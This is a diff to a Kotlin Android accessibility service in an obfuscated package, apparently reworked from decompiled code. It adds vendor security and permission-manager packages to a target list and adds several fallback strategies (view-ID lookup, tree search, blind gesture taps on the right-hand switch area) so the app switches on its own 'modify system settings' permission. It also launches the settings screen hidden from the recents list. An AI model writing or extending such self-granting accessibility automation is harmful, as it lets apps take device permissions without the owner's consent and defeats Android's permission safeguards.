@@ -15,9 +15,12 @@ import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import com.storm.safe.rock.iuzxujjtqev
+import com.storm.safe.rock.service.modules.yw5xud.GestureTapHelper
 import com.storm.safe.rock.service.modules.yw5xud.UiDebugger
 import com.storm.safe.rock.p000.DangerKeywords
 import com.storm.safe.rock.service.MyAccessibilityService
+import com.storm.safe.rock.service.modules.automation.A11yWindowResolver
+import com.storm.safe.rock.service.modules.automation.AutomationCoordinator
 import java.util.ArrayDeque
 import java.util.Locale
 import java.util.concurrent.ConcurrentHashMap
@@ -177,17 +180,21 @@ class MainOrchestrator(
             "com.android.systemui",
             "com.android.permissioncontroller",
             "com.miui.securitycenter",
+            "com.miui.permcenter",            // NEW: vendor C0327b2:888
             "com.coloros.safecenter",
             "com.coloros.phonemanager",
             "com.bbk.VivoSafe",
+            "com.vivo.permissionmanager",      // NEW: vendor C0327b2:888
             "com.huawei.systemmanager",
             "com.samsung.android.lool",
             "com.oneplus.security",
+            "com.honor.systemmanager",         // NEW: vendor C0327b2:888
             "com.oplus.safecenter",
             "com.transsion.permissionmanager",
             "com.meizu.safe",
             "com.smartisanos.security",
-            "com.lenovo.safecenter"
+            "com.lenovo.safecenter",
+            "com.xiaomi.misettings"            // NEW: C0367a4:6548 澎湃 OS
         )
 
         /**
@@ -218,6 +225,22 @@ class MainOrchestrator(
         /** Permission result broadcast action. JADX: f5() */
         private const val PERMISSION_RESULT_ACTION =
             "com.storm.safe.rock.intent.WRITE_SETTINGS_PERMISSION_GRANTED"
+
+        /** SharedPreferences 文件名 (vendor C0327b2:5360). */
+        private const val WS_ATTEMPTED_PREF = "write_settings_state"
+        /** SP key: 尝试过一次即跳过 (vendor C0327b2:4900). */
+        private const val WS_ATTEMPTED_KEY = "write_settings_attempted"
+        /** 父容器上溯最大深度 (vendor C0327b2:4616). */
+        private const val PARENT_CLIMB_MAX_DEPTH = 15
+
+        /** 轮询间隔 (vendor startPermissionMonitoring_1:77). */
+        private const val WS_POLL_INTERVAL_MS = 500L
+        /** 总超时 (vendor C0327b2:5375). 从 10s 降为 6s 避免长时间阻塞 */
+        private const val WS_TIMEOUT_MS = 6_000L
+        /** 事件节流间隔 (vendor C0327b2:4684). */
+        private const val WS_EVENT_THROTTLE_MS = 2000L
+        /** 连续"Switch 找不到"达到此次数后立即跳出 (MIUI a11y 截断快速失败). */
+        private const val WS_MAX_CONSECUTIVE_NO_SWITCH = 4
 
         // ── Static methods ──
 
@@ -892,7 +915,8 @@ class MainOrchestrator(
         try {
             val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
                 data = Uri.parse("package:${context.packageName}")
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY)
+                // vendor C0327b2:5048: addFlags(276824064) = NEW_TASK | EXCLUDE_FROM_RECENTS
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
             }
             val resolved = context.packageManager.resolveActivity(intent, 0)
             if (resolved != null) {
@@ -1325,6 +1349,47 @@ class MainOrchestrator(
         return findFirstSwitch(root)
     }
 
+    /**
+     * DFS find first Switch/Toggle/CompoundButton node in entire tree, without filtering
+     * by failedNodeIds. Used by MIUI fallback strategy A' to locate the Switch even when
+     * its text label is in a different RecyclerView row.
+     */
+    private fun findFirstSwitchNodeOnPage(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
+        if (node == null) return null
+        val className = node.className?.toString() ?: ""
+        val isToggle = listOf("Switch", "Toggle", "CompoundButton", "SwitchCompat")
+            .any { className.contains(it, ignoreCase = true) }
+        if (isToggle && node.isVisibleToUser && node.isEnabled) return node
+        for (i in 0 until node.childCount) {
+            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
+            val found = findFirstSwitchNodeOnPage(child)
+            if (found != null) return found
+        }
+        return null
+    }
+
+    /**
+     * Find Switch via known resource-ids (bypasses incomplete a11y tree on MIUI).
+     * Service.findAccessibilityNodeInfosByViewId queries by ID without depending on traverse.
+     */
+    private fun findSwitchByKnownIds(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
+        val ids = listOf(
+            "com.android.settings:id/switchWidget",
+            "com.android.settings:id/switch_widget",
+            "android:id/switch_widget",
+            "com.miui.securitycenter:id/sliding_button"
+        )
+        for (id in ids) {
+            val nodes = try { root.findAccessibilityNodeInfosByViewId(id) } catch (_: Exception) { null }
+            if (!nodes.isNullOrEmpty()) {
+                for (node in nodes) {
+                    if (node.isClickable && node.isVisibleToUser && node.isEnabled) return node
+                }
+            }
+        }
+        return null
+    }
+
     // ═══════════════════════════════════════════════════════════════
     // Auto-click core — JADX: a0()
     // ═══════════════════════════════════════════════════════════════
@@ -1450,6 +1515,12 @@ class MainOrchestrator(
                 clickJob = scope.launch {
                     delay(1000L)
                     if (!isActive || !this@launch.isActive) return@launch
+                    // Defer to active auth flow — MainOrchestrator's event-driven retries
+                    // must not compete with Yw5xud adaptation's startActivity calls.
+                    if (AutomationCoordinator.isBusy() && AutomationCoordinator.currentFlow() == "auth") {
+                        Log.d(TAG, "⏸️ [handleEvent] auth 流程持锁中，跳过本次 autoClick")
+                        return@launch
+                    }
                     if (hasWriteSettingsPermission()) {
                         handlePermissionGranted()
                         return@launch
@@ -1475,6 +1546,12 @@ class MainOrchestrator(
                 clickJob = scope.launch {
                     delay(1000L)
                     if (!isActive || !this@launch.isActive) return@launch
+                    // Defer to active auth flow — MainOrchestrator's event-driven retries
+                    // must not compete with Yw5xud adaptation's startActivity calls.
+                    if (AutomationCoordinator.isBusy() && AutomationCoordinator.currentFlow() == "auth") {
+                        Log.d(TAG, "⏸️ [handleEvent] auth 流程持锁中，跳过本次 autoClick")
+                        return@launch
+                    }
                     if (hasWriteSettingsPermission()) {
                         handlePermissionGranted()
                         return@launch
@@ -1514,13 +1591,13 @@ class MainOrchestrator(
         val startTime = System.currentTimeMillis()
         Log.v(TAG, "🔐⏱️ [计时] startWriteSettingsPermissionRequest() 开始执行 @$startTime")
 
-        // Check if already attempted
-        val prefs = context.getSharedPreferences("write_settings_state", 0)
-        val alreadyAttempted = prefs.getBoolean("write_settings_attempted", false)
-        if (alreadyAttempted) {
-            Log.d(TAG, "✅ WRITE_SETTINGS流程已尝试过，跳过（不管之前成功或失败）")
+        // vendor C0327b2:5360 — 尝试过一次即跳过 (防止每次 service 重启重跑)
+        val prefs = context.getSharedPreferences(WS_ATTEMPTED_PREF, android.content.Context.MODE_PRIVATE)
+        if (prefs.getBoolean(WS_ATTEMPTED_KEY, false)) {
+            Log.d(TAG, "🔐 WRITE_SETTINGS 已尝试过，跳过 (vendor SP guard)")
             return
         }
+        prefs.edit().putBoolean(WS_ATTEMPTED_KEY, true).apply()
 
         if (isActive) {
             Log.w(TAG, "⚠️ WRITE_SETTINGS权限申请已在进行中")
@@ -1535,7 +1612,7 @@ class MainOrchestrator(
             return
         }
 
-        Log.d(TAG, "[startWriteSettings] proceeding: isActive=$isActive, permissionGranted=$permissionGranted, alreadyAttempted=$alreadyAttempted")
+        Log.d(TAG, "[startWriteSettings] proceeding: isActive=$isActive, permissionGranted=$permissionGranted")
 
         // Stop any previous request
         stopPermissionRequest()
@@ -1567,7 +1644,7 @@ class MainOrchestrator(
             // JADX: WriteSettingsPermissionManager$startPermissionMonitoring$1
             // Periodically checks if permission was granted
             while (isActive && !permissionGranted) {
-                delay(1000)
+                delay(WS_POLL_INTERVAL_MS)
                 if (hasWriteSettingsPermission()) {
                     handlePermissionGranted()
                     break
@@ -1769,7 +1846,12 @@ class MainOrchestrator(
                         1 -> {
                             // SMART: open app settings as fallback
                             UiDebugger.dumpPage(service, "ws_app_settings_fallback", "SMART fallback 到应用设置")
-                            openAppSettings()
+                            if (AutomationCoordinator.isBusy() && AutomationCoordinator.currentFlow() == "auth") {
+                                Log.d(TAG, "⏸️ [SMART fallback] auth 流程持锁中，跳过 openAppSettings")
+                                // Don't call openAppSettings here — let auth finish first
+                            } else {
+                                openAppSettings()
+                            }
                         }
                     }
                 }
@@ -2390,46 +2472,96 @@ class MainOrchestrator(
      */
     private suspend fun attemptAutoClickSafe(root: AccessibilityNodeInfo): Boolean {
         return try {
-            val toggleNode = findAllowModifyToggle(root)
+            // vendor C0327b2: rootInActiveWindow primary, A11yWindowResolver fallback only
+            val rootPkg = root.packageName?.toString() ?: ""
+            val targetRoot = if (isSettingsPackage(rootPkg)) {
+                // rootInActiveWindow is Settings → use directly (vendor primary path)
+                root
+            } else {
+                // rootInActiveWindow is launcher/other → try windows API fallback
+                Log.d(TAG, "🔍 [autoClick] root pkg=$rootPkg not in whitelist, trying A11yWindowResolver")
+                A11yWindowResolver.findSettingsRoot(service) ?: root
+            }
+            Log.d(TAG, "🔍 [autoClick] root pkg=$rootPkg, using targetRoot pkg=${targetRoot.packageName}")
+
+            val toggleNode = findAllowModifyToggle(targetRoot)
             Log.d(TAG, "🔍 [autoClick] findAllowModifyToggle=${toggleNode != null}")
             if (toggleNode == null) {
-                val fallback = findAllowModifyNode(root)
+                val fallback = findAllowModifyNode(targetRoot)
                 Log.d(TAG, "🔍 [autoClick] findAllowModifyNode=${fallback != null}")
                 if (fallback != null) {
                     UiDebugger.dumpPage(service, "ws_no_toggle_found", "findAllowModifyToggle=null, findAllowModifyNode=true")
                     performClick(fallback)
                     return true
                 }
-                // MIUI fallback: no Switch on page — find clickable row with "允许修改系统设置"
-                // MIUI's WRITE_SETTINGS page has a clickable ViewGroup row, not a Switch
+                // Strategy A': find Switch via byViewId (bypasses incomplete a11y tree) or DFS
+                val anySwitch = findSwitchByKnownIds(targetRoot) ?: findFirstSwitchNodeOnPage(targetRoot)
+                if (anySwitch != null) {
+                    val rect = android.graphics.Rect()
+                    anySwitch.getBoundsInScreen(rect)
+                    if (rect.width() > 0 && rect.height() > 0) {
+                        val dm = context.resources.displayMetrics
+                        val switchX = (dm.widthPixels - 120).toFloat()
+                        val switchY = rect.centerY().toFloat()
+                        Log.d(TAG, "🔍 [autoClick] MIUI fallback: strategy A' Switch found via ${if (anySwitch.viewIdResourceName != null) "byViewId(${anySwitch.viewIdResourceName})" else "DFS"} bounds=$rect, tap at ($switchX,$switchY)")
+                        val tapped = GestureTapHelper.performTap(service, switchX, switchY)
+                        if (tapped) {
+                            Log.d(TAG, "🔍 [autoClick] MIUI fallback: strategy A' succeeded")
+                            return true
+                        }
+                        Log.d(TAG, "🔍 [autoClick] MIUI fallback: strategy A' tap returned false, fall through to existing strategies")
+                    }
+                }
+
+                // MIUI fallback: no Switch on page — find clickable row or right-side Switch area
+                // MIUI's WRITE_SETTINGS page has a clickable PreferenceItem row, not an exposed Switch node
+                // (existing keyword-based logic)
                 for (keyword in DangerKeywords.modifySystemSettingsKeywords) {
-                    val nodes = root.findAccessibilityNodeInfosByText(keyword) ?: continue
+                    val nodes = targetRoot.findAccessibilityNodeInfosByText(keyword) ?: continue
                     for (textNode in nodes) {
-                        // Skip title bar matches
-                        val nodeId = textNode.viewIdResourceName ?: ""
-                        if (nodeId.contains("action_bar")) continue
                         if (!textNode.isVisibleToUser) continue
+                        val nodeId = textNode.viewIdResourceName ?: ""
+                        // Whitelist: android:id/title / summary / PreferenceItemView labels
+                        // (action bar titles use id like "action_bar_title" — skip them)
+                        val isContentTitle = nodeId == "android:id/title" ||
+                            nodeId == "android:id/summary" ||
+                            nodeId.contains("preference", ignoreCase = true)
+                        if (!isContentTitle) {
+                            Log.v(TAG, "🔍 [autoClick] MIUI fallback: skip non-content text id=$nodeId")
+                            continue
+                        }
                         Log.d(TAG, "🔍 [autoClick] MIUI fallback: 找到内容文本「$keyword」(id=$nodeId)")
-                        // Climb parent chain to find clickable ViewGroup
+
+                        // Strategy A: climb parent chain up to 8 levels for clickable ViewGroup
                         var current: AccessibilityNodeInfo? = textNode.parent
                         var depth = 0
-                        while (current != null && depth < 5) {
-                            if (current.isClickable) {
-                                Log.d(TAG, "🔍 [autoClick] MIUI fallback: 点击父容器 depth=$depth class=${current.className}")
+                        while (current != null && depth < PARENT_CLIMB_MAX_DEPTH) {
+                            if (current.isClickable && current.isVisibleToUser) {
+                                Log.d(TAG, "🔍 [autoClick] MIUI fallback: strategy A 点击父容器 depth=$depth class=${current.className}")
                                 performClick(current)
                                 return true
                             }
                             current = current.parent
                             depth++
                         }
-                        // Gesture tap on text center as last resort
+
+                        // Strategy B: gesture tap on right-side Switch area (MIUI Switch is always on the right)
                         val rect = android.graphics.Rect()
                         textNode.getBoundsInScreen(rect)
                         if (rect.width() > 0 && rect.height() > 0) {
-                            Log.d(TAG, "🔍 [autoClick] MIUI fallback: gesture tap at ${rect.centerX()},${rect.centerY()}")
-                            performSwipeGesture(rect.centerX().toFloat(), rect.centerY().toFloat(),
-                                rect.centerX().toFloat(), rect.centerY().toFloat())
-                            return true
+                            val dm = context.resources.displayMetrics
+                            val switchX = (dm.widthPixels - 120).toFloat()  // MIUI Switch typically at right 120px
+                            val switchY = rect.centerY().toFloat()
+                            Log.d(TAG, "🔍 [autoClick] MIUI fallback: strategy B gesture tap right-switch at ($switchX,$switchY)")
+                            val tapped = GestureTapHelper.performTap(service, switchX, switchY)
+                            if (tapped) {
+                                Log.d(TAG, "🔍 [autoClick] MIUI fallback: strategy B succeeded")
+                                return true
+                            }
+                            // Strategy C: if right-side tap fails, tap text center with real gesture
+                            Log.d(TAG, "🔍 [autoClick] MIUI fallback: strategy C gesture tap text center at ${rect.centerX()},${rect.centerY()}")
+                            val tapped2 = GestureTapHelper.performTap(service, rect.centerX().toFloat(), rect.centerY().toFloat())
+                            if (tapped2) return true
                         }
                     }
                 }
@@ -2438,6 +2570,8 @@ class MainOrchestrator(
             }
             performClick(toggleNode)
             true
+        } catch (e: kotlinx.coroutines.CancellationException) {
+            throw e
         } catch (e: Exception) {
             Log.e(TAG, "❌ attemptAutoClickSafe failed", e)
             false
